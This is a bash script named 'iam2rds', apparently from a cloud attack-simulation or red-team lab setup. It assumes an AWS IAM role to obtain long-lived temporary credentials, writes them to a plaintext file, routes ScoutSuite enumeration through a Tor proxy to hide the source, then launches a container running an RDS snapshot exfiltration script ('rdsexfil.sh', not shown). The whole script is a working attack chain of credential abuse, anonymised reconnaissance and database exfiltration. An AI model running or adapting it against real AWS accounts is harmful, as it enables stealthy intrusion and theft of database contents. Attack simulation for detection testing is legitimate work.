#!/bin/bash

SCRIPTNAME=iam2rds
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

log "Checking for aws cli..."
while ! which aws > /dev/null; do
    log "aws cli not found or not ready - waiting"
    sleep 120
done
log "aws path: $(which aws)"

log "installing jq..."
if ! which jq 2> /dev/null; then
  apt-get install -y jq
fi

#######################
# aws cred setup
#######################

REGION=${region}
ENVIRONMENT=target
DEPLOYMENT=${deployment}

log "Using default profile"
PROFILE="default"
opts="--no-cli-pager"

ROLE_NAME="${iam2rds_role_name}"
SESSION_NAME="${iam2rds_session_name}"

log "Running: aws sts get-caller-identity --profile=$PROFILE"
aws sts get-caller-identity --profile=$PROFILE $opts >> $LOGFILE 2>&1

log "Getting current account number..."
AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
log "Account Number: $AWS_ACCOUNT_NUMBER"

log "Assuming role: arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME"
CREDS=$(aws sts assume-role --role-arn "arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME" --profile=$PROFILE --role-session-name "$SESSION_NAME" --duration-seconds="43200" $opts)
AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.Credentials.AccessKeyId')
AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.Credentials.SecretAccessKey')
AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Credentials.SessionToken')

cat > .aws-iam-user <<-EOF
AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF

PROFILE="db"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
aws configure set region $REGION --profile=$PROFILE
aws configure set output json --profile=$PROFILE

#######################
# cloud enumeration
#######################

# reset docker containers
log "Stopping and removing any existing tor containers..."
docker stop torproxy > /dev/null 2>&1
docker rm torproxy > /dev/null 2>&1
docker stop proxychains-scoutsuite-aws > /dev/null 2>&1
docker rm proxychains-scoutsuite-aws > /dev/null 2>&1

# start tor proxy
log "Starting tor proxy..."
docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy

# build scoutsuite proxychains
TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
log "TORPROXY: $TORPROXY - starting scoutsuite"
docker run --name=proxychains-scoutsuite-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY --env-file=.aws-iam-user -v "$PWD/scout-report":"/root/scout-report" ghcr.io/credibleforce/proxychains-scoutsuite-aws:main scout aws --report-dir /root/scout-report --no-browser
docker logs proxychains-scoutsuite-aws > /tmp/proxychains-scoutsuite-aws.log 2>&1

#######################
# rds exfil snapshot and export
#######################
docker stop proxychains-aws
docker rm proxychains-aws
docker run --name=proxychains-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY --env-file=.aws-iam-user -v "$PWD":"/tmp" -v "$PWD/root":"/root" ghcr.io/credibleforce/proxychains-scoutsuite-aws:main /bin/bash /tmp/rdsexfil.sh
docker logs proxychains-aws > /tmp/proxychains-aws.log
log "Done"